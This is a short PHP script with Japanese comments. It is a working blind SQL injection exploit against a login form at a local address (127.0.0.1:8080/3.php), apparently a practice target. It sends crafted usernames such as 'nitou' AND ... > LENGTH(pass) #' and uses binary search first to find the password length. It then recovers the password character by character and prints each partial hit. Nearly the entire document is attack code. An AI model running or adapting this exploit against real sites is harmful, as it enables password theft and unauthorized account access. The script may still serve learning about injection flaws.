<?php
	// ログインを試行する
	function login($user){
		// POSTリクエストを送信準備
		$h = curl_init("http://127.0.0.1:8080/3.php");
		curl_setopt_array($h, [
			CURLOPT_POST => true,
			CURLOPT_POSTFIELDS => http_build_query([
				"user" => $user,
				"pass" => ""
			]),
			CURLOPT_RETURNTRANSFER => true
		]);
		
		// POSTリクエストを送信しレスポンス取得
		$resp = curl_exec($h);
		
		// ログインに成功していたらtrue, 失敗していたらfalseを返す
		return strpos($resp, "succeeded") !== false;
	}
	
	// 二分探索
	function binary_search($l, $r, $buildSQL){
		// $l: 探索範囲の左端
		// $r: 探索範囲の右端
		// $buildSQL: 探索範囲の中央値を受け取って試行するSQL文を返す関数
		
		$c = (int)($l + ($r - $l) / 2);
		while($l < $c && $c < $r){
			// 探索範囲を更新
			if(login($buildSQL($c))){
				$r = $c;
			}else{
				$l = $c;
			}
			$c = (int)($l + ($r - $l) / 2);
		}
		
		return $c;
	}
	
	// パスワード長の特定
	$len = binary_search(1, 100, function($len){
		return "nitou' AND {$len} > LENGTH(pass) #";
	});
	echo("Password length: {$len}\n");
	
	// パスワードの特定
	$pass = "";
	for($i = 0; $i < $len; $i++){
		$ch = binary_search(32, 126, function($ch) use ($pass){
			$try = $pass . chr($ch);
			$try = str_replace(["%", "_", "'"], ["\\%", "\\_", "''"], $try);
			return "nitou' AND '{$try}' > BINARY pass #";
		});
		
		$pass .= chr($ch);
		echo("Hit: {$pass}\n");
	}
	echo("Password: {$pass}\n");
?>